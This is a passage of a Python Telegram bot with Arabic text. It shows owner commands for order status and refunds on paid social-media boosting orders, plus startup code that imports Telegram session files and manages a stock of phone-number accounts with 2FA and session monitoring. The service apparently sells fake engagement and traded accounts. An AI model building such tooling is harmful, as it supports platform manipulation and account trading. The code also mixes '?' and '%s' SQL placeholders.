    if user and user.id == OWNER_ID:
        await _cleanup_pending_login(user.id)
    context.user_data["state"] = "main_menu"
    await update.message.reply_text(
        "🔙 تم التوقف والرجوع للقائمة الرئيسية.",
        reply_markup=owner_settings_kb() if (user and user.id == OWNER_ID) else main_menu_kb()
    )


async def cmd_status_order(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر المالك: /status <كود_الطلب> — يعرض تفاصيل طلب بكوده."""
    user = update.effective_user
    if user.id != OWNER_ID:
        await update.message.reply_text("⛔ هذا الأمر للمالك فقط.")
        return
    if not context.args:
        await update.message.reply_text("الاستخدام:\n/status <كود_الطلب>")
        return
    code = context.args[0].strip()
    with db_conn() as c:
        order = c.execute(
            "SELECT o.*, s.name_ar FROM orders o LEFT JOIN services s ON s.id=o.service_id WHERE o.order_code=?",
            (code,)
        ).fetchone()
    if not order:
        await update.message.reply_text(f"⚠️ لا يوجد طلب بالكود: {code}")
        return
    status_map = {"pending": "⏳ قيد الانتظار", "completed": "✅ مكتمل", "cancelled": "❌ ملغى"}
    status_label = status_map.get(order["status"], order["status"])
    await update.message.reply_text(
        f"📋 *تفاصيل الطلب*\n\n"
        f"📌 الكود: `{order['order_code']}`\n"
        f"👤 المستخدم: {order['user_id']}\n"
        f"🔹 الخدمة: {order['name_ar'] or '—'}\n"
        f"🔗 الرابط: {order['link']}\n"
        f"🔢 الكمية: {order['quantity']}\n"
        f"💰 التكلفة: {order['cost_points']} نقطة\n"
        f"📊 الحالة: {status_label}\n"
        f"🆔 كود API: {order['api_order_id'] or '—'}\n"
        f"🕐 التاريخ: {order['created_at']}",
        parse_mode=ParseMode.MARKDOWN
    )


async def cmd_compensate_partial(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر المالك: /compensate_partial
    يفحص جميع طلبات SMMMAIN المكتملة التي لم تحصل على تعويض جزئي بعد،
    يسأل موقع الرشق عن حالتها، وإن كانت Partial يحسب النقاط ويُعيدها لأصحابها.
    مفيد لتعويض المستخدمين الذين خسروا نقاطاً قبل تفعيل هذه الميزة."""
    user = update.effective_user
    if user.id != OWNER_ID:
        await update.message.reply_text("⛔ هذا الأمر للمالك فقط.")
        return

    await update.message.reply_text(
        "🔍 جاري فحص الطلبات المكتملة للبحث عن طلبات جزئية غير معوَّضة...\n"
        "⏳ قد يستغرق هذا بعض الوقت حسب عدد الطلبات."
    )

    # جلب الطلبات المكتملة من SMMMAIN التي لم تحصل على تعويض جزئي بعد
    try:
        with db_conn() as c:
            candidates = c.execute(
                "SELECT o.*, s.panel AS svc_panel, s.api_service_id AS svc_api_id "
                "FROM orders o "
                "LEFT JOIN services s ON s.id = o.service_id "
                "WHERE o.status='completed' "
                "  AND (o.partial_refund_pts IS NULL OR o.partial_refund_pts = 0) "
                "  AND o.api_order_id IS NOT NULL AND o.api_order_id != '' "
                "  AND (s.panel = 1 OR s.panel IS NULL)"   # فقط SMMMAIN
            ).fetchall()
    except Exception as e:
        await update.message.reply_text(f"❌ خطأ في جلب الطلبات: {e}")
        return

    if not candidates:
        await update.message.reply_text("✅ لا توجد طلبات تحتاج فحصاً.")
        return

    await update.message.reply_text(f"📋 عدد الطلبات المراد فحصها: {len(candidates):,}")

    compensated, skipped, errors = 0, 0, 0
    total_pts_given = 0

    for o in candidates:
        try:
            res = smm_order_status(o["api_order_id"], panel=1)
        except Exception:
            errors += 1
            continue

        if not isinstance(res, dict) or "error" in res:
            skipped += 1
            continue

        panel_status = str(res.get("status", "")).strip().lower()

        if panel_status != "partial":
            skipped += 1
            continue

        remains = int(res.get("remains", 0) or 0)
        if remains <= 0 or not o.get("svc_api_id"):
            skipped += 1
            continue

        refund_pts = _calc_partial_refund_pts(o["svc_api_id"], remains)
        if refund_pts <= 0:
            skipped += 1
            continue

        # منح النقاط وتسجيل التعويض
        add_points(o["user_id"], refund_pts)
        with db_conn() as c:
            c.execute(
                "UPDATE orders SET partial_refund_pts=%s WHERE id=%s",
                (refund_pts, o["id"])
            )

        # إشعار المستخدم
        try:
            await context.bot.send_message(
                o["user_id"],
                f"💰 *تعويض طلب جزئي*\n\n"
                f"📌 كود الطلب: `{o['order_code']}`\n"
                f"📦 الوحدات غير المنفذة: {remains:,}\n"
                f"✅ تم إضافة *{refund_pts:,}* نقطة إلى رصيدك تعويضاً.\n\n"
                f"نعتذر عن التأخير في هذا التعويض.",
                parse_mode="Markdown"
            )
        except Exception:
            pass

        compensated += 1
        total_pts_given += refund_pts
        logger.info(f"✅ تعويض جزئي: طلب {o['order_code']} — {refund_pts:,} نقطة → {o['user_id']}")

    await update.message.reply_text(
        f"✅ *انتهى فحص التعويضات*\n\n"
        f"💚 طلبات عُوِّضت: {compensated}\n"
        f"💰 إجمالي النقاط الموزّعة: {total_pts_given:,}\n"
        f"⏭ طلبات تخطّيها (غير جزئية): {skipped}\n"
        f"❌ أخطاء API: {errors}",
        parse_mode="Markdown"
    )


async def cmd_refund_mandatory(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر المالك: /refund_mandatory
    كان هنالك خلل في تفعيل الاشتراك الإجباري يجعل المستخدمين القدامى لا يُطالَبون
    بالانضمام للقنوات الإجبارية الجديدة (تم إصلاحه الآن). هذا الأمر يعيد نقاط كل من
    دفع لتفعيل «تمويل قناة إجباري سريع» ولم يُسترجع له ماله بعد، ويرسل له اعتذاراً
    مع طلب إعادة تفعيل تمويل قناته من جديد بعد الإصلاح."""
    user = update.effective_user
    if user.id != OWNER_ID:
        await update.message.reply_text("⛔ هذا الأمر للمالك فقط.")
        return

    with db_conn() as c:
        fundings = c.execute(
            "SELECT * FROM channel_funding WHERE funding_type='mandatory' AND status != 'refunded'"
        ).fetchall()

    if not fundings:
        await update.message.reply_text("✅ لا توجد تمويلات إجبارية بحاجة لاسترجاع.")
        return

    await update.message.reply_text(
        f"🔍 تم العثور على {len(fundings):,} تمويل إجباري. جاري إعادة النقاط والاعتذار لأصحابها..."
    )

    refunded, errors, total_pts = 0, 0, 0
    for f in fundings:
        pts = f.get("cost_points", 0) or 0
        try:
            if pts:
                add_points(f["user_id"], pts)
            with db_conn() as c:
                c.execute("UPDATE channel_funding SET status='refunded' WHERE id=?", (f["id"],))
                c.execute(
                    "UPDATE mandatory_channels SET active=0, queued=0 WHERE channel_username=? AND funding_type='mandatory'",
                    (f["channel_username"],)
                )
        except Exception as e:
            logger.warning(f"⚠️ فشل استرجاع تمويل القناة @{f.get('channel_username')}: {e}")
            errors += 1
            continue

        try:
            await context.bot.send_message(
                f["user_id"],
                f"🙏 *اعتذار بخصوص تمويل قناتك @{f['channel_username']}*\n\n"
                f"اكتشفنا خللاً فنياً كان يمنع القناة الإجبارية من الظهور لبعض\n"
                f"المستخدمين القدامى في البوت، ما أثّر على نتيجة تمويلك.\n\n"
                f"✅ تم إعادة *{pts:,}* نقطة كاملة إلى رصيدك تعويضاً عن ذلك.\n"
                f"🛠 تم إصلاح الخلل الآن بالكامل، وأصبحت القنوات الإجبارية تظهر لجميع\n"
                f"المستخدمين (القدامى والجدد) في كل مرة يستخدمون فيها البوت.\n\n"
                f"🔁 يمكنك الآن إعادة طلب «📺 تمويل قناتك حقيقي ← تمويل قناة إجباري سريع»\n"
                f"من القائمة الرئيسية لتفعيل تمويل قناتك من جديد والاستفادة الكاملة منه.\n\n"
                f"نعتذر عن الإزعاج ونشكر تفهمك 🌹",
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception:
            pass

        refunded += 1
        total_pts += pts
        logger.info(f"✅ استرجاع تمويل إجباري: @{f['channel_username']} — {pts:,} نقطة → {f['user_id']}")

    await promote_queued_mandatory_channel(context, app=context.application)

    await update.message.reply_text(
        f"✅ *انتهى استرجاع تمويلات الاشتراك الإجباري*\n\n"
        f"💚 عدد من تم استرجاع تمويله: {refunded}\n"
        f"💰 إجمالي النقاط المُعادة: {total_pts:,}\n"
        f"❌ أخطاء: {errors}",
        parse_mode=ParseMode.MARKDOWN
    )


def main():
    # ── التحقق من المتغيرات البيئية الضرورية عند الإطلاق ──────────────────
    missing = []
    if not BOT_TOKEN:
        missing.append("BOT_TOKEN")
    if not DATABASE_URL:
        missing.append("DATABASE_URL")
    if not OWNER_ID:
        missing.append("OWNER_ID")
    if missing:
        logger.critical(f"❌ متغيرات بيئية مفقودة: {', '.join(missing)}")
        logger.critical("❌ أضفها في إعدادات Railway ثم أعد التشغيل.")
        raise SystemExit(1)

    init_db()
    start_health_server()

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",     cmd_start))
    app.add_handler(CommandHandler("admin",     cmd_admin))
    app.add_handler(CommandHandler("addpoints", cmd_addpoints))
    app.add_handler(CommandHandler("grant_ref", cmd_grant_ref))
    app.add_handler(CommandHandler("broadcast",           cmd_broadcast))
    app.add_handler(CommandHandler("status",              cmd_status_order))
    app.add_handler(CommandHandler("compensate_partial",  cmd_compensate_partial))
    app.add_handler(CommandHandler("refund_mandatory",    cmd_refund_mandatory))
    app.add_handler(CommandHandler("cancel",              cmd_cancel))
    app.add_handler(CommandHandler("import_session",      cmd_import_session))
    app.add_handler(CommandHandler("import_sessions",     cmd_import_sessions))
    app.add_handler(CommandHandler("import_hex",          cmd_import_hex))
    app.add_handler(MessageHandler(
        (filters.TEXT | filters.CAPTION) & ~filters.COMMAND & filters.ChatType.PRIVATE,
        handle_text
    ))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(PreCheckoutQueryHandler(pre_checkout))
    app.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, successful_payment))
    app.add_handler(MessageHandler(
        filters.ChatType.PRIVATE & filters.Document.MimeType("application/json"),
        handle_json_file
    ))
    app.add_handler(MessageHandler(
        filters.ChatType.PRIVATE & filters.Document.FileExtension("session"),
        handle_session_file
    ))
    app.add_handler(MessageHandler(
        filters.ChatType.PRIVATE & filters.Document.FileExtension("zip"),
        handle_zip_file
    ))
    # ── شبكة أمان: أي رسالة أخرى (صورة/ملصق/جهة اتصال بلا نص) لا تطابق ما سبق ──
    # حتى لا يبقى البوت صامتاً تماماً بلا أي رد إذا أرسل المستخدم قناته/رده بطريقة غير متوقعة
    # (توجيه/مشاركة بدل الكتابة المباشرة).
    app.add_handler(MessageHandler(
        filters.ChatType.PRIVATE & ~filters.COMMAND & ~filters.SUCCESSFUL_PAYMENT,
        handle_unsupported_message
    ))
    app.add_handler(ChatMemberHandler(handle_member_leave, ChatMemberHandler.CHAT_MEMBER))
    if ADMIN_GROUP_ID:
        app.add_handler(MessageHandler(
            filters.Chat(ADMIN_GROUP_ID) &
            (filters.StatusUpdate.NEW_CHAT_MEMBERS | filters.StatusUpdate.LEFT_CHAT_MEMBER),
            delete_group_service_messages
        ))

    async def post_init(application):
        # أوامر عامة لجميع المستخدمين
        await application.bot.set_my_commands([
            BotCommand("start", "🏠 القائمة الرئيسية"),
        ])
        # أوامر إضافية للمالك فقط
        # ملاحظة: تيليجرام يرفض تعيين أوامر خاصة بمحادثة (BotCommandScopeChat) إذا لم
        # يكن هناك تواصل سابق بين البوت وهذا الـ chat_id (خطأ "Chat not found").
        # هذا متوقع قبل أن يرسل المالك /start للبوت لأول مرة، فلا يجب أن يوقف تشغيل البوت.
        if OWNER_ID:
            try:
                await application.bot.set_my_commands(
                    [
                        BotCommand("start",     "🏠 القائمة الرئيسية"),
                        BotCommand("admin",     "⚙️ لوحة المالك"),
                        BotCommand("addpoints", "💰 إضافة/خصم نقاط لمستخدم"),
                        BotCommand("broadcast",          "📢 إرسال رسالة جماعية"),
                        BotCommand("status",             "🔍 فحص حالة طلب"),
                        BotCommand("compensate_partial", "💰 تعويض أصحاب الطلبات الجزئية"),
                        BotCommand("refund_mandatory", "🔁 استرجاع تمويلات الاشتراك الإجباري"),
                    ],
                    scope=BotCommandScopeChat(chat_id=OWNER_ID)
                )
            except Exception as e:
                logger.warning(f"⚠️ تعذّر تعيين أوامر المالك الخاصة (ربما لم يبدأ المالك محادثة مع البوت بعد): {e}")
        logger.info("✅ Bot commands set")
        try:
            await start_all_number_monitors(application)
        except Exception as e:
            logger.error(f"❌ خطأ في بدء مراقبة الأرقام: {e}")
        # فحص فوري عند الإقلاع لاكتشاف أي بيع مكرر قديم وتعويض أصحابه
        try:
            await compensate_duplicate_sales_job(
                type("_ctx", (), {"bot": application.bot})()
            )
        except Exception as e:
            logger.warning(f"⚠️ compensate_duplicate_sales (startup): {e}")
        # حذف الأرقام اليدوية (بلا جلسة) من المخزون عند كل إقلاع
        try:
            with db_conn() as _mc:
                _mc.execute(
                    "UPDATE number_stock SET deleted_at=NOW() "
                    "WHERE session_string IS NULL AND deleted_at IS NULL"
                )
                _deleted_manual = _mc.rowcount
            if _deleted_manual:
                logger.warning(f"🗑 حُذفت {_deleted_manual} أرقام يدوية (بلا جلسة) عند الإقلاع.")
        except Exception as e:
            logger.warning(f"⚠️ تنظيف الأرقام اليدوية (startup): {e}")

    # ── معالج الأخطاء العام ──
    async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
        err = context.error
        if isinstance(err, RetryAfter):
            logger.warning(f"⚠️ RetryAfter: {err.retry_after}s")
            return
        if isinstance(err, (NetworkError, TimedOut)):
            logger.warning(f"⚠️ خطأ شبكي مؤقت: {err}")
            return
        logger.error(f"❌ خطأ غير متوقع:\n{traceback.format_exc()}")

    app.add_error_handler(error_handler)
    app.post_init = post_init

    if app.job_queue:
        app.job_queue.run_repeating(check_pending_orders_job, interval=300, first=30)
        logger.info("⏱️ تم تفعيل الفحص الدوري لحالة الطلبات (كل 5 دقائق)")
        app.job_queue.run_repeating(retry_pending_session_resets, interval=600, first=90)
        logger.info("🔒 تم تفعيل إعادة المحاولة الدورية لطرد جلسات الأرقام (كل 10 دقائق)")
        app.job_queue.run_repeating(run_referral_tasks_job, interval=3600, first=120)
        logger.info("🤝 تم تفعيل مهام الإحالة التلقائية (كل ساعة)")
        app.job_queue.run_repeating(monitor_number_changes_job, interval=1800, first=210)
        logger.info("🔔 تم تفعيل مراقبة تغيّرات حسابات الأرقام (طرد/تجميد/أجهزة) كل 30 دقيقة")
        app.job_queue.run_repeating(compensate_duplicate_sales_job, interval=21600, first=300)
        logger.info("🔁 تم تفعيل فحص البيع المكرر وتعويض المتضررين (كل 6 ساعات)")
        app.job_queue.run_repeating(check_twofa_reset_job, interval=3600, first=60)
        logger.info("🔐 تم تفعيل فحص إكمال إعادة تعيين 2FA (كل ساعة)")

    logger.info("🤖 Bot started!")
    app.run_polling(
        drop_pending_updates=True,
        read_timeout=30,
        write_timeout=30,
        connect_timeout=30,
        pool_timeout=30,
        allowed_updates=["message", "callback_query", "pre_checkout_query", "successful_payment", "chat_member"],
    )

if __name__ == "__main__":
    main()
